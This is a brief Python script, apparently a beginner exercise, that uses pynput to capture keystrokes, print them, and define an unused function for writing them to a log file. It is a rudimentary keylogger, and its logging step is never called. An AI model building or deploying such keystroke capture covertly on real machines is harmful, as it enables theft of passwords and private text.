import pynput

from pynput.keyboard import Key,Listener
keys=[]
def on_press(key):
    global keys, count
    keys.append(key)
    print(f" pressed {key}")
def write_log(keys):
    with open("loghelp.txt","w") as f:
        for key in keys:
            f.write(str(key))

def on_release(key):
    if key==Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()